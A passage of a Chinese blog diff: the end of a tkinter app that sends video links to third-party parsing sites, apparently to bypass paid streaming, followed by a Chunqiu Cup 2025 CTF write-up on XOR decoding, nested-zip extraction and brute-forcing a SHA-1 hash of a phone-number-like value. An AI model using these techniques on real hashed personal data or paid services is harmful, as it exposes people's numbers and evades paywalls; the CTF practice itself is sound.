tk.Menu(menu, tearoff=0)</span><br><span class="line">        menu.add_cascade(label=&#x27;友情链接&#x27;, menu=moviemenu)</span><br><span class="line">        # 各个网站链接</span><br><span class="line">        moviemenu.add_command(label=&#x27;腾讯视频&#x27;, command=lambda: webbrowser.open(&#x27;http://v.qq.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;搜狐视频&#x27;, command=lambda: webbrowser.open(&#x27;http://tv.sohu.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;芒果TV&#x27;, command=lambda: webbrowser.open(&#x27;http://www.mgtv.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;爱奇艺&#x27;, command=lambda: webbrowser.open(&#x27;http://www.iqiyi.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;PPTV&#x27;, command=lambda: webbrowser.open(&#x27;http://www.bilibili.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;优酷&#x27;, command=lambda: webbrowser.open(&#x27;http://www.youku.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;乐视&#x27;, command=lambda: webbrowser.open(&#x27;http://www.le.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;土豆&#x27;, command=lambda: webbrowser.open(&#x27;http://www.tudou.com/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;A站&#x27;, command=lambda: webbrowser.open(&#x27;http://www.acfun.tv/&#x27;))</span><br><span class="line">        moviemenu.add_command(label=&#x27;B站&#x27;, command=lambda: webbrowser.open(&#x27;http://www.bilibili.com/&#x27;))</span><br><span class="line"></span><br><span class="line">        # 控件内容设置</span><br><span class="line">        group = tk.Label(frame_1, text=&#x27;请选择一个视频播放通道：&#x27;, padx=10, pady=10)</span><br><span class="line">        tb1 = tk.Radiobutton(frame_1, text=&#x27;通道一&#x27;, variable=self.v, value=1, width=10, height=3)</span><br><span class="line">        tb2 = tk.Radiobutton(frame_1, text=&#x27;通道二&#x27;, variable=self.v, value=2, width=10, height=3)</span><br><span class="line">        label1 = tk.Label(frame_2, text=&quot;请输入视频链接：&quot;)</span><br><span class="line">        entry = tk.Entry(frame_2, textvariable=self.url, highlightcolor=&#x27;Fuchsia&#x27;, highlightthickness=1, width=35)</span><br><span class="line">        label2 = tk.Label(frame_2, text=&quot; &quot;)</span><br><span class="line">        play = tk.Button(frame_2, text=&quot;播放&quot;, font=(&#x27;楷体&#x27;, 12), fg=&#x27;Purple&#x27;, width=2, height=1, command=self.video_play)</span><br><span class="line">        label3 = tk.Label(frame_2, text=&quot; &quot;)</span><br><span class="line">        label_explain = tk.Label(frame_3, fg=&#x27;red&#x27;, font=(&#x27;楷体&#x27;, 12),</span><br><span class="line">                                 text=&#x27;\n注意：支持大部分主流视频网站的视频播放！\n此软件仅用于交流学习，请勿用于任何商业用途！&#x27;)</span><br><span class="line">        label_warning = tk.Label(frame_3, fg=&#x27;blue&#x27;, font=(&#x27;楷体&#x27;, 12), text=&#x27;\n建议：将Chrome内核浏览器设置为默认浏览器&#x27;)</span><br><span class="line"></span><br><span class="line">        # 控件布局</span><br><span class="line">        frame_1.pack()</span><br><span class="line">        frame_2.pack()</span><br><span class="line">        frame_3.pack()</span><br><span class="line">        group.grid(row=0, column=0)</span><br><span class="line">        tb1.grid(row=0, column=1)</span><br><span class="line">        tb2.grid(row=0, column=2)</span><br><span class="line">        label1.grid(row=0, column=0)</span><br><span class="line">        entry.grid(row=0, column=1)</span><br><span class="line">        label2.grid(row=0, column=2)</span><br><span class="line">        play.grid(row=0, column=3, ipadx=10, ipady=10)</span><br><span class="line">        label3.grid(row=0, column=4)</span><br><span class="line">        label_explain.grid(row=1, column=0)</span><br><span class="line">        label_warning.grid(row=2, column=0)</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    函数说明:视频播放</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def video_play(self):</span><br><span class="line">        # 视频解析网站地址</span><br><span class="line">        port_1 = &#x27;http://www.wmxz.wang/video.php?url=&#x27;</span><br><span class="line">        port_2 = &#x27;http://www.vipjiexi.com/tong.php?url=&#x27;</span><br><span class="line"></span><br><span class="line">        # 正则表达是判定是否为合法链接</span><br><span class="line">        if re.match(r&#x27;^https?:/&#123;2&#125;\w.+$&#x27;, self.url.get()):</span><br><span class="line">            if self.v.get() == 1:</span><br><span class="line">                # 视频链接获取</span><br><span class="line">                ip = self.url.get()</span><br><span class="line">                # 视频链接加密</span><br><span class="line">                ip = parse.quote_plus(ip)</span><br><span class="line">                # 浏览器打开</span><br><span class="line">                webbrowser.open(port_1 + self.url.get())</span><br><span class="line">            elif self.v.get() == 2:</span><br><span class="line">                # 链接获取</span><br><span class="line">                ip = self.url.get()</span><br><span class="line">                # 链接加密</span><br><span class="line">                ip = parse.quote_plus(ip)</span><br><span class="line"></span><br><span class="line">                # 获取time、key、url</span><br><span class="line">                get_url = &#x27;http://www.vipjiexi.com/x2/tong.php?url=%s&#x27; % ip</span><br><span class="line"></span><br><span class="line">                # 请求之后立刻打开</span><br><span class="line">                webbrowser.open(get_url)</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            msgbox.showerror(title=&#x27;错误&#x27;, message=&#x27;视频链接地址无效，请重新输入！&#x27;)</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    函数说明:tkinter窗口居中</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def center(self):</span><br><span class="line">        ws = self.root.winfo_screenwidth()</span><br><span class="line">        hs = self.root.winfo_screenheight()</span><br><span class="line">        x = int((ws / 2) - (self.w / 2))</span><br><span class="line">        y = int((hs / 2) - (self.h / 2))</span><br><span class="line">        self.root.geometry(&#x27;&#123;&#125;x&#123;&#125;+&#123;&#125;+&#123;&#125;&#x27;.format(self.w, self.h, x, y))</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    函数说明:loop等待用户事件</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def loop(self):</span><br><span class="line">        # 禁止修改窗口大小</span><br><span class="line">        self.root.resizable(False, False)</span><br><span class="line">        # 窗口居中</span><br><span class="line">        self.center()</span><br><span class="line">        self.root.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app = APP()  # 实例化APP对象</span><br><span class="line">    app.loop()  # loop等待用户事件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/" class="post-title-link" itemprop="url">春秋杯(2025)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-19 20:52:28" itemprop="dateCreated datePublished" datetime="2025-01-19T20:52:28+08:00">2025-01-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:21:14" itemprop="dateModified" datetime="2025-06-20T10:21:14+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="春秋杯（2025）"><a href="#春秋杯（2025）" class="headerlink" title="春秋杯（2025）"></a>春秋杯（2025）</h1><ul>
+<li><p><a href="#msic">msic</a></p>
+<ul>
+<li><a href="#%E7%AE%80%E5%8D%95%E7%AE%97%E6%9C%AF">简单算术</a></li>
+<li><a href="#%E5%8E%8B%E5%8A%9B%E5%A4%A7%EF%BC%8C%E5%86%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%90%A7">压力大，写个脚本吧</a></li>
+</ul>
+</li>
+<li><p><a href="#Crypot">Crypot</a></p>
+<ul>
+<li><a href="#%E9%80%9A%E5%BE%80%E5%93%88%E5%B8%8C%E7%9A%84%E6%97%85%E7%A8%8B">通往哈希的旅程</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="msic"><a href="#msic" class="headerlink" title="msic"></a>msic</h2><h3 id="简单算术"><a href="#简单算术" class="headerlink" title="简单算术"></a>简单算术</h3><p>1.打开附件看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ys~xdg/m@]mjkz@vl@z~lf&gt;b</span><br></pre></td></tr></table></figure>
+
+<p>2.根据题目意思<br>想想异或<br>可以想到异或运算（a^b&#x3D;c,b^c&#x3D;a,a^c&#x3D;b)</p>
+<p>一般的flag结尾都是}，先让b和}异或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char a=&#x27;b&#x27;;</span><br><span class="line">	char b=&#x27;&#125;&#x27;;</span><br><span class="line">	char c;</span><br><span class="line">	c=a^b;</span><br><span class="line">	printf(&quot;%d&quot;,c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到31</p>
+<p>3.再用31依次和字符串异或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	</span><br><span class="line">    char a[]=&quot;ys~xdg/m@]mjkz@vl@z~lf&gt;b&quot;;</span><br><span class="line">    int lenght= strlen(a);</span><br><span class="line">	char b=&#x27;31&#x27;;</span><br><span class="line">	char c[lenght];</span><br><span class="line">	int i;</span><br><span class="line">	for(i=0;i&lt;lenght;i++)&#123;</span><br><span class="line">		c[i]=a[i]^31;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,c);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117174125235.png" alt="image-20250117174125235"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;x0r_Brute_is_easy!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h3><p>1.发现是一个百层压缩<br>2.解了几次发现都有密码上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_password_from_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;从给定路径的文件中读取Base64编码的密码并解码&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">            encoded_password = file.read().strip()</span><br><span class="line">            password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            return password</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error reading password from &#123;file_path&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def un_zip(path, file_name, password):</span><br><span class="line">    &quot;&quot;&quot;解压ZIP文件到指定路径，并提供密码&quot;&quot;&quot;</span><br><span class="line">    current_file = os.path.join(path, file_name)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with zipfile.ZipFile(current_file) as zip_file:</span><br><span class="line">            # 获取第一个非隐藏文件的名字作为新的目录名</span><br><span class="line">            for new_file in zip_file.namelist():</span><br><span class="line">                if not (new_file.startswith(&#x27;__MACOSX&#x27;) or new_file.endswith(&#x27;/&#x27;)):</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">            # 创建一个以解压出来的压缩包为名字的新文件夹</span><br><span class="line">            new_path = os.path.join(path, os.path.splitext(file_name)[0])</span><br><span class="line">            os.makedirs(new_path, exist_ok=True)</span><br><span class="line"></span><br><span class="line">            # 解压所有内容到新路径，并提供密码</span><br><span class="line">            zip_file.extractall(path=new_path, pwd=password.encode())</span><br><span class="line"></span><br><span class="line">            return new_path, new_file</span><br><span class="line"></span><br><span class="line">    except RuntimeError as e:</span><br><span class="line">        print(f&quot;RuntimeError: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;An error occurred while unzipping &#123;file_name&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_next_password_file(base_path, last_number):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据上次使用的密码文件数字，在解压后的文件夹中查找下一个密码文件。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    next_number = last_number - 1</span><br><span class="line">    next_password_filename = f&quot;password_&#123;next_number:02&#125;.txt&quot;</span><br><span class="line">    next_password_file_path = os.path.join(base_path, next_password_filename)</span><br><span class="line"></span><br><span class="line">    if os.path.exists(next_password_file_path):</span><br><span class="line">        return next_password_file_path</span><br><span class="line">    else:</span><br><span class="line">        raise FileNotFoundError(f&quot;Next password file &#123;next_password_filename&#125; not found.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解压缩所需的参数</span><br><span class="line">base_path = r&quot;D:\桌面\zip_100&quot;</span><br><span class="line">initial_file_to_unzip = &quot;zip_99.zip&quot;</span><br><span class="line">initial_password_file = os.path.join(base_path, &quot;password_99.txt&quot;)</span><br><span class="line"></span><br><span class="line"># 开始解压过程</span><br><span class="line">current_path = base_path</span><br><span class="line">file_to_unzip = initial_file_to_unzip</span><br><span class="line">last_password_number = 99</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # 读取当前密码</span><br><span class="line">        password = read_password_from_file(initial_password_file)</span><br><span class="line"></span><br><span class="line">        # 解压当前ZIP文件</span><br><span class="line">        current_path, new_file = un_zip(current_path, file_to_unzip, password)</span><br><span class="line">        print(f&quot;Unzipped: &#123;new_file&#125; to &#123;current_path&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否还有zip文件需要解压</span><br><span class="line">        if new_file.lower().endswith(&#x27;.zip&#x27;):</span><br><span class="line">            # 更新要解压的文件路径</span><br><span class="line">            file_to_unzip = new_file</span><br><span class="line"></span><br><span class="line">            # 查找下一个密码文件</span><br><span class="line">            next_password_file = find_next_password_file(current_path, last_password_number)</span><br><span class="line">            last_password_number -= 1</span><br><span class="line">            initial_password_file = next_password_file</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Stopped unzipping process due to an error: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(&quot;End of unzipping process.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117174837151.png" alt="image-20250117174837151"></p>
+<p>3.发现问题改进下脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_password_from_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;从给定路径的文件中读取Base64编码的密码并解码&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">            encoded_password = file.read().strip()</span><br><span class="line">            password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            return password</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error reading password from &#123;file_path&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def un_zip(path, file_name, password):</span><br><span class="line">    &quot;&quot;&quot;解压ZIP文件到指定路径，并提供密码&quot;&quot;&quot;</span><br><span class="line">    current_file = os.path.join(path, file_name)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with zipfile.ZipFile(current_file) as zip_file:</span><br><span class="line">            # 创建一个以解压出来的压缩包为名字的新文件夹</span><br><span class="line">            new_path = os.path.join(path, os.path.splitext(file_name)[0])</span><br><span class="line">            os.makedirs(new_path, exist_ok=True)</span><br><span class="line"></span><br><span class="line">            # 解压所有内容到新路径，并提供密码</span><br><span class="line">            zip_file.extractall(path=new_path, pwd=password.encode())</span><br><span class="line"></span><br><span class="line">            return new_path, zip_file.namelist()  # 返回解压的所有文件列表</span><br><span class="line">    except RuntimeError as e:</span><br><span class="line">        print(f&quot;RuntimeError: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;An error occurred while unzipping &#123;file_name&#125;: &#123;e&#125;&quot;)</span><br><span class="line">        raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_next_password_file(base_path, last_number):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据上次使用的密码文件数字，在解压后的文件夹中查找下一个密码文件。</span><br><span class="line">    支持一位数和两位数的文件名。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    next_number = last_number - 1</span><br><span class="line">    for format_str in [&#x27;%d&#x27;, &#x27;%02d&#x27;]:  # 尝试两种格式</span><br><span class="line">        next_password_filename = f&quot;password_&#123;format_str % next_number&#125;.txt&quot;</span><br><span class="line">        next_password_file_path = os.path.join(base_path, next_password_filename)</span><br><span class="line">        if os.path.exists(next_password_file_path):</span><br><span class="line">            return next_password_file_path</span><br><span class="line"></span><br><span class="line">    raise FileNotFoundError(f&quot;Next password file not found for number &#123;next_number&#125;.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 解压缩所需的参数</span><br><span class="line">base_path = r&quot;D:\桌面\zip_100&quot;</span><br><span class="line">initial_file_to_unzip = &quot;zip_99.zip&quot;</span><br><span class="line">initial_password_file = os.path.join(base_path, &quot;password_99.txt&quot;)</span><br><span class="line"></span><br><span class="line"># 开始解压过程</span><br><span class="line">current_path = base_path</span><br><span class="line">file_to_unzip = initial_file_to_unzip</span><br><span class="line">last_password_number = 99</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # 读取当前密码</span><br><span class="line">        password = read_password_from_file(initial_password_file)</span><br><span class="line"></span><br><span class="line">        # 解压当前ZIP文件</span><br><span class="line">        current_path, extracted_files = un_zip(current_path, file_to_unzip, password)</span><br><span class="line">        print(f&quot;Unzipped: &#123;file_to_unzip&#125; to &#123;current_path&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否还有zip文件需要解压</span><br><span class="line">        zip_files = [f for f in extracted_files if f.lower().endswith(&#x27;.zip&#x27;)]</span><br><span class="line">        if zip_files:</span><br><span class="line">            # 更新要解压的文件路径</span><br><span class="line">            file_to_unzip = zip_files[0]  # 假设只有一个ZIP文件被解压出来</span><br><span class="line"></span><br><span class="line">            # 查找下一个密码文件</span><br><span class="line">            next_password_file = find_next_password_file(current_path, last_password_number)</span><br><span class="line">            last_password_number -= 1</span><br><span class="line">            initial_password_file = next_password_file</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Stopped unzipping process due to an error: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(&quot;End of unzipping process.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175112049.png" alt="image-20250117175112049"></p>
+<p>完成解压</p>
+<p>3.打开最后一个文件</p>
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175301990.png" alt="image-20250117175301990"></p>
+<p>4.可以看到密码加密码和png可以想到把base64都拼在一起可能会得到一个png的图片，拼接后：</p>
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175558172.png" alt="image-20250117175558172"></p>
+<p>5.得到一个二维码：<br><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175629639.png" alt="image-20250117175629639"></p>
+<p><a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">在线扫描二维码</a></p>
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117175853810.png" alt="image-20250117175853810"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;_PASSWORDs_is_fl@g!_&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="通往哈希的旅程"><a href="#通往哈希的旅程" class="headerlink" title="通往哈希的旅程"></a>通往哈希的旅程</h2><p>1.有题目已知前三位是188，而且是11位</p>
+<p>用脚本爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"># 给定的哈希值</span><br><span class="line">given_hash = &#x27;ca12fd8250972ec363a16593356abb1f3cf3a16d&#x27;</span><br><span class="line"></span><br><span class="line"># 检查函数</span><br><span class="line">def check_hash(value):</span><br><span class="line">    # 生成该值的SHA-1哈希</span><br><span class="line">    hash_object = hashlib.sha1(value.encode())</span><br><span class="line">    hex_dig = hash_object.hexdigest()</span><br><span class="line">    return hex_dig == given_hash</span><br><span class="line"></span><br><span class="line"># 尝试所有可能的11位数字组合</span><br><span class="line">for i in range(18800000000, 18900000000):  # 从18800000000到18899999999</span><br><span class="line">    if check_hash(str(i)):</span><br><span class="line">        print(f&quot;Found match: &#123;i&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No match found&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF-2025/assets/image-20250117182920364.png" alt="image-20250117182920364"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;18876011645&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
